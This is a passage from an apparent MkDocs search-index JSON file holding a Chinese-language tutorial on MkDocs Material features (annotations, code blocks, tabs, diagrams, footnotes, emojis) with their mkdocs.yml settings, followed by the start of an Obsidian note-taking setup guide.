<p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#annotations","title":"Annotations","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n  - attr_list\n  - md_in_html\n  - pymdownx.superfences\ntheme:\n  icon:\n    annotation: material/plus-circle\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_5","title":"\u7528\u6cd5","text":"<p>\u4e0b\u9762\u662f\u4e00\u6bb5\u793a\u4f8b\u683c\u5f0f\uff1a</p> <pre><code>    \u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f(1)\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u3002\n    { .annotate } %% \u8bb0\u4f4f\u8fd9\u91cc\u8981\u7d27\u8d34\u4e0a\u6587 %%\n    %% \u6ce8\u610f\u8fd9\u91cc\u8981\u7a7a\u4e00\u884c %%\n    1. \u8fd9\u662f\u4e00\u6bb5\u65c1\u6ce8\n</code></pre> <p>\u6548\u679c\u5982\u4e0b</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f(1)\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u3002</p> <ol> <li>\u8fd9\u662f\u4e00\u6bb5\u65c1\u6ce8\u3002</li> </ol> <p>\u8fd9\u4e2a\u53ef\u4ee5\u5728\u5927\u591a\u573a\u5408\u4f7f\u7528\uff0c\u5982\u6807\u9898\uff0c\u8868\u683c\u751a\u81f3\u5d4c\u5957\u4f7f\u7528\uff0c\u4f46\u662f\u8003\u8651\u5230\u57fa\u672c\u4e0d\u4f1a\u7528\uff08\u811a\u6ce8\u53ef\u4ee5\u66ff\u4ee3\uff09\uff0c\u4e0d\u52a0\u8ba8\u8bba</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#buttons","title":"Buttons","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_1","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n\n    - attr_list\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_6","title":"\u7528\u6cd5","text":"<pre><code>[click here for more](#){.md-button}\n// \u5373\u4f7f\u7528 `{.md-button}` \u8fdb\u884c\u58f0\u660e\uff0c `#` \u4e2d\u53ef\u586b\u5199\u94fe\u63a5\uff0c\u9ed8\u8ba4\u662f\u8be5\u9875\u9762\u7684\u4e00\u7ea7\u6807\u9898\n[click here for more](#){ .md-button .md-button--primary }\n// \u52a0\u4e0a `.md-button--primary` \u8868\u793a\u586b\u5145\n</code></pre> <p>click here for more</p> <p>click here for more</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#code-blocks","title":"Code blocks","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_2","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n  - pymdownx.highlight:\n      anchor_linenums: true\n      line_spans: __span\n      pygments_lang_class: true\n  - pymdownx.inlinehilite\n  - pymdownx.snippets\n  - pymdownx.superfences\n\ntheme:\n  features:\n    - content.code.copy\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_7","title":"\u7528\u6cd5","text":"<p>\u4f7f\u7528\u4e09\u5bf9\u53cd\u5f15\u53f7\u5c06\u4ee3\u7801\u5305\u88f9\u5373\u53ef\uff0c\u6ce8\u610f\uff1a\u4ee3\u7801\u9002\u5f53\u7f29\u8fdb</p> <p>\u5176\u4ed6\u64cd\u4f5c\uff1a</p> <ul> <li>\u53ef\u5728\u524d\u4e09\u4e2a\u53cd\u5f15\u53f7\u540e\u6dfb\u52a0\u4ee3\u7801\u8bed\u8a00\u4ee5\u4fbf\u9ad8\u4eae\uff1b</li> <li>\u8fd8\u53ef\u6dfb\u52a0\u5c5e\u6027 title=\"\u6807\u9898\" \u6765\u53d6\u6807\u9898\uff1b</li> <li>\u8fd8\u53ef\u6dfb\u52a0\u6ce8\u91ca\uff0c\u8981\u6c42\u4f7f\u7528\u5bf9\u5e94\u4ee3\u7801\u8bed\u8a00\u7684\u6ce8\u91ca\u65b9\u6cd5\uff0c\u5982python\u5c31\u662f <code># (1)</code>\uff0c\u4e0d\u60f3\u8981\u663e\u793a <code>#</code> \u7684\u8bdd\u5728 (1) \u540e\u9762\u6dfb\u52a0 ! \u5373\u53ef\uff1b</li> <li>\u6dfb\u52a0\u884c\u53f7 <code>linenums=\"&lt;start&gt;\"</code> start \u8868\u793a\u8d77\u59cb\u884c\u53f7\uff1b</li> <li>\u9ad8\u4eae\u67d0\u884c hl_lines=\"\u884c\u53f7\" \u884c\u53f7\u53ef\u7528\u7a7a\u683c\u95f4\u9694\u9ad8\u4eae\u591a\u884c\uff0c\u53ef\u7528 a-b \u8868\u793a\u9ad8\u4eae\u884c\u6570\u8303\u56f4\uff1b\u884c\u53f7\u662f\u5728\u4e0b\u9762\u6253\u7801\u5757\u4e2d\u7684\u884c\u53f7\uff1b</li> <li>\u4f7f\u7528 <code>#!python</code> \u4f7f\u5f97\u5185\u8054\u4ee3\u7801\u5757\u53ef\u4ee5\u9ad8\u4eae\uff0c\u4f8b\u5982 <code>print(i)</code></li> </ul> first.py<pre><code>print(\"hello world!\") # (1)!\nfor i in range(1, 10):\n    print(i)\n</code></pre> <ol> <li>\u6253\u5370\u201chello world\u201d</li> </ol>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#content-tabs","title":"Content tabs","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_3","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>- pymdownx.tabbed:\n\n  alternate_style: true\n\n  slugify: !!python/object/apply:pymdownx.slugs.slugify\n\n      kwds:\n\n      case: lower\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_8","title":"\u7528\u6cd5","text":"<p>\u4f7f\u7528 <code>===</code> \u540e\u4f7f\u7528\u82f1\u6587\u53cc\u5f15\u53f7\u5305\u88f9 table_name \uff0c\u4e4b\u540e\u7a7a\u4e00\u884c\u52a0\u4e0a\u5185\u5bb9\uff0c\u5982\uff1a</p> <pre><code>=== \"C\"\n\n```c\n\n    ```c\n\n    **include**{: .hash} &lt;stdio.h&gt;\n\n    int main(void) {\n\n      printf(\"Hello world!\\n\");\n\n      return 0;\n\n    }\n\n    ```\n\n=== \"C++\"\n\n    ``` c++\n\n    **include**{: .hash} &lt;iostream&gt;\n\n    int main(void) {\n\n      std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n\n      return 0;\n\n    }\n\n    ```\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\uff1a</p> CC++ <pre><code>#include &lt;stdio.h&gt;\nint main(void) {\n  printf(\"Hello world!\\n\");\n  return 0;\n}\n</code></pre> <pre><code>#include &lt;iostream&gt;\nint main(void) {\n  std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n  return 0;\n}\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#data-tables","title":"Data tables","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_4","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n    - tables\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_9","title":"\u7528\u6cd5","text":"<p>\uff08\u4e0e markdown \u4e2d\u662f\u4e00\u81f4\u7684\uff09</p> Method Description <code>GET</code> :material-check:     Fetch resource <code>PUT</code> :material-check-all: Update resource <code>DELETE</code> :material-close:     Delete resource &gt; \u5173\u4e8e\u4e00\u4e9b\u8868\u60c5\u8bf7\u770b Icons, Emojis","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#diagrams","title":"Diagrams","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_5","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n  - pymdownx.superfences:\n      custom_fences:\n        - name: mermaid\n          class: mermaid\n          format: !!python/name:pymdownx.superfences.fence_code_format\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_10","title":"\u7528\u6cd5","text":"<p>\u4e0b\u9762\u6211\u4eec\u770b\u770b flowcharts \u7684\u8868\u73b0\u5f62\u5f0f\uff0c\u5176\u4ed6\u4e0d\u52a0\u89e3\u91ca \u56e0\u4e3a\u6211\u7684\u7b14\u8bb0\u4e3b\u8981\u4f7f\u7528 obsidian \u5236\u4f5c\u6d41\u7a0b\u56fe\u3002</p> <p><pre><code>    ``` mermaid\n\n    graph LR\n\n      A[Start] --&gt; B{Error?};\n\n      B --&gt;|Yes| C[Hmm...];\n\n      C --&gt; D[Debug];\n\n      D --&gt; B;\n\n      B ----&gt;|No| E[Yay!It works!];\n\n    ```\n</code></pre> \u4e0b\u9762\u662f\u6548\u679c\uff0c\u53ef\u4ee5\u770b\u51fa\u4e0d\u540c\u7684\u62ec\u53f7\u7684\u5448\u73b0\u6548\u679c\u4e0d\u540c <pre><code>\ngraph LR\n\n  A[Start] --&gt; B{Error?};\n\n  B --&gt;|Yes| C[Hmm...];\n\n  C --&gt; D[Debug];\n\n  D --&gt; B;\n\n  B ----&gt;|No| E[Yay! It works!];\n</code></pre></p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#footnotes","title":"Footnotes","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_6","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n  - footnotes\ntheme:\n  features:\n    - content.footnote.tooltips\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_11","title":"\u7528\u6cd5","text":"<p>\u5176\u5b9e\u4f7f\u7528\u65b9\u6cd5\u4e0e Markdown \u7684\u8bed\u6cd5\u662f\u57fa\u672c\u4e00\u81f4\u7684\uff0c\u5e76\u63d0\u4f9b\u4e86\u5bfb\u627e\u7d22\u5f15\u7684\u8d85\u94fe\u63a5\uff1a <pre><code>  Lorem ipsum[^1] dolor sit amet, consectetur adipiscing elit.[^2]\n\n  [^1]: Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n\n  [^2]:\n\n      Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.\n</code></pre> Lorem ipsum<sup>1</sup> dolor sit amet, consectetur adipiscing elit.<sup>2</sup></p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#grids","title":"Grids","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_7","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>    markdown_extensions: \n      - attr_list\n      - md_in_html\n</code></pre> \u7528\u6cd5<pre><code>&lt;div class=\"grid card\" markdown&gt;\n=== \"Unordered list\"\n    * Sed sagittis eleifend rutrum\n    * Donec vitae suscipit est\n    * Nulla tempor lobortis orci\n=== \"Ordered list\"\n    1. Sed sagittis eleifend rutrum\n    2. Donec vitae suscipit est\n    3. Nulla tempor lobortis orci\n``` title=\"Content tabs\"\n=== \"Unordered list\"\n    * Sed sagittis eleifend rutrum\n    * Donec vitae suscipit est\n    * Nulla tempor lobortis orci\n=== \"Ordered list\"\n    1. Sed sagittis eleifend rutrum\n    2. Donec vitae suscipit est\n    3. Nulla tempor lobortis orci\n&lt;/div&gt;\n</code></pre> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> Content tabs<pre><code>=== \"Unordered list\"\n\n    * Sed sagittis eleifend rutrum\n\n    * Donec vitae suscipit est\n\n    * Nulla tempor lobortis orci\n\n=== \"Ordered list\"\n\n    1. Sed sagittis eleifend rutrum\n\n    2. Donec vitae suscipit est\n\n    3. Nulla tempor lobortis orci\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#icons-emojis","title":"Icons, Emojis","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#mkdocsyml_8","title":"mkdocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>markdown_extensions:\n  - attr_list\n  - pymdownx.emoji:\n      emoji_index: !!python/name:material.extensions.emoji.twemoji\n      emoji_generator: !!python/name:material.extensions.emoji.to_svg\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_12","title":"\u7528\u6cd5","text":"<p>\u8868\u60c5\u7b26\u53f7\u53ef\u4ee5\u901a\u8fc7\u5c06\u8868\u60c5\u7b26\u53f7\u7684\u77ed\u4ee3\u7801\u653e\u5728\u4e24\u4e2a\u5192\u53f7\u4e4b\u95f4\u6765\u96c6\u6210\u5230 Markdown \u4e2d \u6211\u4eec\u53ef\u4ee5\u53bb Emojipedia \u4e0a\u590d\u5236\u8fc7\u6765\ud83d\ude00</p> <ol> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.\u00a0\u21a9</p> </li> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.\u00a0\u21a9</p> </li> </ol>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/","title":"Obsidian begin","text":"","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#obsidian_begin","title":"Obsidian_begin","text":"Summary <p>Obsidian \u662f\u4e00\u6b3e\u6d41\u884c\u7684\u7b14\u8bb0\u8f6f\u4ef6\uff0c\u4ee5\u5176\u7075\u6d3b\u6027\u548c\u53ef\u5b9a\u5236\u6027\u800c\u95fb\u540d\u3002</p> <ul> <li>\u7b14\u8bb0\u7ec4\u7ec7\uff1a Obsidian \u4f7f\u7528\u53cc\u5411\u94fe\u63a5\u7cfb\u7edf\uff0c\u5141\u8bb8\u7528\u6237\u8f7b\u677e\u5730\u5c06\u7b14\u8bb0\u76f8\u4e92\u8fde\u63a5\uff0c\u5f62\u6210\u4e00\u4e2a\u77e5\u8bc6\u7f51\u7edc\u3002</li> <li>\u53ef\u5b9a\u5236\u6027\uff1a Obsidian \u63d0\u4f9b\u5e7f\u6cdb\u7684\u63d2\u4ef6\u548c\u4e3b\u9898\uff0c\u7528\u6237\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u5b9a\u5236\u8f6f\u4ef6\u3002</li> <li>Markdown \u652f\u6301\uff1a Obsidian \u652f\u6301 Markdown \u8bed\u6cd5\uff0c\u4f7f\u7b14\u8bb0\u4e66\u5199\u548c\u683c\u5f0f\u5316\u53d8\u5f97\u5bb9\u6613\u3002</li> <li>\u79bb\u7ebf\u4f7f\u7528\uff1a Obsidian \u53ef\u4ee5\u5728\u6ca1\u6709\u4e92\u8054\u7f51\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u786e\u4fdd\u7b14\u8bb0\u7684\u9690\u79c1\u548c\u5b89\u5168\u6027\u3002</li> </ul> <p>Tip</p> <p>\u7531\u4e8e\u90e8\u5206 obsidian\uff08\u540e\u6587\u53ef\u80fd\u7b80\u79f0 ob\uff09 \u7684\u683c\u5f0f\u5728 mkdocs \u4e0a\u65e0\u6cd5\u5f88\u597d\u5730\u663e\u73b0\u51fa\u6765\uff0c\u4f60\u53ef\u4ee5\u4e0b\u8f7d obsidian_begin.zip \u8ddf\u7740\u64cd\u4f5c\u6216\u5728 Obsidian_begin.pdf \u67e5\u770b\u6548\u679c\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#i","title":"I \u5f15\u8a00","text":"<p>Wiki</p> <p>Obsidian \u662f\u4f7f\u7528 Markdown \u8bed\u6cd5\u7684\u95ed\u6e90\u7b14\u8bb0\u8f6f\u4ef6\u3002\u7528\u6237\u53ef\u4ee5\u5728\u7b14\u8bb0\u95f4\u5efa\u7acb\u53cc\u5411\u94fe\u63a5\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a2\u7d22\u8fd9\u4e9b\u7b14\u8bb0\u8fde\u63a5\u5f62\u6210\u7684\u5173\u7cfb\u56fe\u8c31\u3002\u8be5\u8f6f\u4ef6\u65e8\u5728\u5e2e\u52a9\u7528\u6237\u4ee5\u4e00\u79cd\u7075\u6d3b\u7684\u3001\u975e\u7ebf\u6027\u7684\u65b9\u5f0f\u6765\u7ec4\u7ec7\u548c\u6784\u67b6\u4ed6\u4eec\u7684\u60f3\u6cd5\u548c\u77e5\u8bc6\u3002</p> <p>\u57fa\u672c\u7684\u4e0b\u8f7d\u3001\u521b\u5efa\u3001\u5bfc\u5165\u7b14\u8bb0\u5728 \u5165\u95e8\u6307\u5357 \u5341\u5206\u6e05\u6670\uff0c\u4e0d\u52a0\u8d58\u8ff0\u3002</p> <p>obsidian\u6587\u6863\u5496\u5561\u8c46\u7248 \u771f\u7684\u662f\u4e00\u4e2a\u5f88\u597d\u5730\u63a2\u7d22 obsidian \u7684\u6587\u6863\uff0c\u8fd9\u91cc\u66f4\u591a\u6536\u7eb3\u7684\u662f\u6211\u4e2a\u4eba\u7684\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4ece\u5176\u4e2d\u53d6\u5f97\u7684\u5b9e\u73b0\uff1b\u7f8e\u4e2d\u4e0d\u8db3\u7684\u662f\u8be5\u7f51\u7ad9\u641c\u7d22\u51fa\u6765\u540e\u8df3\u8f6c\u611a\u7b28\uff08\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u6211\u8fd9\u91cc\u7684\u95ee\u9898\uff09\uff0c\u53ef\u4ee5\u7528\u641c\u7d22\u5f15\u64ce\u89e3\u51b3\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#ii","title":"II \u9605\u8bfb\u8bbe\u7f6e","text":"<p>obsidian \u9ad8\u5ea6\u53ef\u5b9a\u5236\u5316\uff08css/js \u5927\u4f6c\u53ef\u4ee5\u628a\u8fd9\u4e2a\u8f6f\u4ef6\u5916\u89c2\u53d8\u5f97\u82b1\u91cc\u80e1\u54e8\u7684\uff09\u662f\u5176\u4e00\u5927\u7279\u70b9\uff0c\u4e0b\u9762\u7684\u8bbe\u7f6e\u80fd\u591f\u63d0\u9ad8\u9605\u8bfb\u4f53\u9a8c\uff1b\u63d0\u793a\uff0c\u5728 ob \u4e2d\u6309\u4f4f <code>ctrl</code> \uff08\u6216\u8005 mac \u5bf9\u5e94\u952e\uff1f\uff09\u53ef\u4ee5\u9884\u89c8\u94fe\u63a5\u7b14\u8bb0\u5185\u5bb9\uff1b\u5982\u679c\u5e0c\u671b\u9884\u89c8\u7f51\u9875\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a <code>Surfing</code> \u63d2\u4ef6\uff0c\u8be6\u89c1\u540e\u6587\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#ii1","title":"II.1 \u57fa\u672c\u8bbe\u7f6e","text":"<ul> <li>\u5173\u4e8e<ul> <li>\u8bbe\u7f6e\u8bed\u8a00\u4e3a\u4e2d\u6587\uff1b</li> </ul> </li> <li>\u7f16\u8f91\u5668<ul> <li>\u90fd\u5f88\u5bb9\u6613\u660e\u767d\uff0c\u81ea\u4e3b\u6289\u62e9\uff0c\u57fa\u672c\u90fd\u53ef\u4ee5\u52fe\u9009\uff1b</li> </ul> </li> <li>\u6587\u4ef6\u4e0e\u94fe\u63a5<ul> <li>\u5982\u56fe\uff0c\u5efa\u8bae\u662f\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u56e0\u4e3a\u7b14\u8bb0\u96be\u4ee5\u907f\u514d\u4f1a\u79fb\u52a8\uff1b</li> </ul> </li> <li>\u63d2\u4ef6<ul> <li>\u6838\u5fc3\u63d2\u4ef6\u5b98\u65b9\u6587\u6863\u5f88\u9f50\u5168\u4e86\uff1b</li> <li>\u793e\u533a\u63d2\u4ef6\u5728\u5899\u5916\uff0cpkmer \u662f\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u5728\u8fd9\u91cc\u4e0b\u8f7d\uff1b</li> </ul> </li> <li>\u5916\u89c2\uff08\u90e8\u5206\u6548\u679c\u9700\u8981\u91cd\u542f obsidian \u5b9e\u73b0\uff09<ul> <li>\u5982\u56fe\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3b\u9898\u989c\u8272\uff0c\u540c\u65f6\u7ba1\u7406\u4e2d\u53ef\u4ee5\u9009\u62e9\u81ea\u5df1\u559c\u6b22\u7684\u4e3b\u9898\u4f7f\u7528\uff0c\u70ed\u95e8\u4e3b\u9898\u5f80\u5f80\u662f\u6709\u8fdb\u4e00\u6b65\u5b9a\u5236\u5316\u7684\u53ef\u80fd\u6027\uff0c\u53ef\u80fd\u4f7f\u7528 <code>sytle settings</code> \u63d2\u4ef6\u3002</li> <li>\u5b57\u4f53\u53ef\u4ee5\u8bbe\u7f6e\u4f7f\u7528\u971e\u9e6d\u6587\u6977 \uff0c\u8bb0\u5f97\u653e\u5728\u6700\u4e0a\u8fb9\uff1b</li> <li>\u5f80\u4e0b\u6ed1\uff0c\u53ef\u4ee5\u770b\u89c1 CSS\u4ee3\u7801\u7247\u6bb5\uff1b\u8fd9\u91cc\u5141\u8bb8\u6211\u4eec\u4f7f\u7528\u81ea\u5df1\u7684 css \u6765\u8986\u76d6\u8f6f\u4ef6\u672c\u8eab\u7684\u4e00\u4e9b\u8bbe\u7f6e\uff1b<ul> <li>\u7b80\u5355\u4f7f\u7528\uff1a<ul> <li>\u70b9\u51fb\u4e0a\u56fe\u4e2d\u53f3\u4e0a\u89d2\u201c\u6587\u4ef6\u5939\u56fe\u6807\u201d\uff0c\u5c06 xx.css \u6587\u4ef6\u653e\u5165\u5176\u4e2d\uff1b</li> <li>\u8fd4\u56de\u6765\uff0c\u70b9\u51fb\u201c\u5237\u65b0\u56fe\u6807\u201d\uff0c\u5c06\u5bf9\u5e94\u5f00\u5173\u6253\u5f00\uff0c\u518d\u6b21\u5237\u65b0\uff1b</li> <li>\u6b64\u65f6\u5e94\u5f53\u5448\u73b0\u5e94\u6709\u7684\u6548\u679c\u4e86\uff0c\u5982\u6ca1\u6709\uff0c\u91cd\u542f ob \u8bd5\u8bd5\uff1b</li> <li>\u5982\u679c\u67d0\u4e9b\u63d2\u4ef6\u4e5f\u6709\u7c7b\u4f3c\u6548\u679c\u53ef\u80fd\u4f1a\u51b2\u7a81\uff1b</li> </ul> </li> <li>snippets<ul> <li>custom-admonitions\uff1a\u7528\u4e8e\u81ea\u5b9a\u4e49\u63d2\u4ef6 admonitions\uff1b</li> <li>img_center\uff1a\u4f7f\u5f97\u672c\u5730\u56fe\u7247\u5c45\u4e2d\u663e\u793a\uff0c\u56fe\u5e8a\u56fe\u7247\u6682\u65f6\u6ca1\u80fd\u5b9e\u73b0\uff1b\u5f53\u7136\u53ef\u80fd\u6709\u7684\u4e3b\u9898\u672c\u8eab\u652f\u6301\u8fd9\u4e00\u529f\u80fd\uff0c\u62e9\u9700\u4f7f\u7528\uff1b</li> </ul> </li> </ul> </li> </ul> </li> <li>\u5feb\u6377\u952e<ul> <li>\u81ea\u884c\u8bbe\u7f6e\uff0c\u6bd4\u5982\u53ef\u4ee5\u8ba9 <code>Alt+1</code> \u8868\u793a\u4e00\u7ea7\u6807\u9898\uff0c\u4f9d\u6b21\u7c7b\u63a8\u2026\u2026</li> </ul> </li> </ul> <p>\u5982\u679c\u4f60\u53ea\u662f\u6765\u4f7f\u7528 obsidian \u9605\u8bfb\u5df2\u6709\u7684\u7b14\u8bb0\uff0c\u90a3\u4e48\u6682\u65f6\u591f\u4e86\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii","title":"III \u4f7f\u7528\u6559\u7a0b","text":"","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii1","title":"III.1 \u94fe\u63a5","text":"<p>\u6700\u8ba9\u6211\u60ca\u559c\u7684\u662f\u8fd9\u91cc\u663e\u793a\u6587\u4ef6\u5e76\u4e0d\u8003\u8651\u5927\u5c0f\u5199\u3001\u4e0d\u8bb2\u7a76\u8def\u5f84\uff0c\u5b83\u4f1a\u5728\u5168\u5e93\u4e2d\u6309\u540d\u5b57\u641c\u7d22\uff08\u5f53\u7136\u8003\u8651\u5230\u79fb\u690d\u6027\uff0c\u80fd\u52a0\u5f53\u52a0\uff09\uff0c\u4e5f\u53ef\u5728\u5de6\u4e0b\u89d2 <code>\u8bbe\u7f6e&gt;\u6587\u4ef6\u4e0e\u94fe\u63a5</code> \u4e2d\u5982\u4e0b\u8bbe\u7f6e\uff0c\u8fd9\u6837\u62d6\u8fdb\u6765\u7684\u6587\u4ef6\u5c31\u4f1a\u7ed9\u51fa\u76f8\u5bf9\u8def\u5f84\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u7edd\u5bf9\u8def\u5f84\uff0c\u4f46\u662f\u8003\u8651\u5230\u6587\u4ef6\u53ef\u80fd\u79fb\u52a8\uff0c\u76f8\u5bf9\u8def\u5f84\u5f80\u5f80\u662f\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u9009\u62e9\uff09</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii11","title":"III.1.1 \u5185\u90e8\u94fe\u63a5","text":"<p>\u5728 Markdown \u4e2d\u6211\u4eec\u4f7f\u7528  <code>[]()</code>  \u6765\u6784\u6210\u94fe\u63a5\uff0c\u800c\u5728 Obsidian \u4e2d\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Wiki \u94fe\u63a5\uff0c\u5982\u4e0b\uff0c\u4e5f\u662f\u5728 <code>\u8bbe\u7f6e&gt;\u6587\u4ef6\u4e0e\u94fe\u63a5</code> \u4e2d</p> <p></p> <p>\u901a\u8fc7 <code>[[]]</code> \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u5185\u90e8\u94fe\u63a5\uff08\u5373\u94fe\u63a5\u5230\u5e93\u5185\u90e8\u7684\u6587\u4ef6\u7684\u94fe\u63a5\uff09</p> <p>\u4f8b\u5982\uff1a\u8f93\u5165\u4e24\u4e2a <code>[</code> \uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u5f39\u51fa\u7684\u6587\u4ef6\u540d\u4e2d\u9009\u62e9\u6587\u4ef6\u518d\u6572\u51fb<code>enter</code>\u5373\u53ef</p> <p>\u8be6\u7ec6\u7528\u6cd5\u6572\u4e24\u4e2a <code>[</code> \u5728\u4e0b\u65b9\u80fd\u770b\u89c1\uff0c\u4e0d\u518d\u8d58\u8ff0</p> <p>\u6b64\u5916\uff0c <code>[[\u6587\u4ef6\u540d#\u6807\u9898\u540d]]</code> \u53ef\u4ee5\u5c06\u8d85\u94fe\u63a5\u6307\u5411\u5177\u4f53\u6bb5\u843d</p> <p><code>[[\u6587\u4ef6\u540d#\u6807\u9898|\u663e\u793a\u5185\u5bb9]]</code> \u53ef\u4ee5\u5c06\u663e\u793a\u51fa\u6765\u7684\u5185\u5bb9\u505a\u51fa\u4fee\u6539</p> <p>\u4f46\u662f\u4ecd\u5efa\u8bae\u4f7f\u7528\u6807\u51c6 markdown \u4ee5\u63d0\u9ad8\u79fb\u690d\u6027\uff0c\u800c <code>[[]]</code> \u7684\u5feb\u6377\u65b9\u5f0f\u4f9d\u65e7\u9002\u7528\uff0cob \u4f1a\u81ea\u52a8\u8fdb\u884c\u8f6c\u6362\uff1b\u540e\u9762\u7684\u6559\u7a0b\u4ecd\u4f7f\u7528 <code>[[]]</code> \u4e5f\u65e0\u59a8\uff0c\u7b49\u540c\u4e8e <code>[]()</code>\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii12","title":"III.1.2 \u5916\u90e8\u94fe\u63a5","text":"<p>\u901a\u8fc7 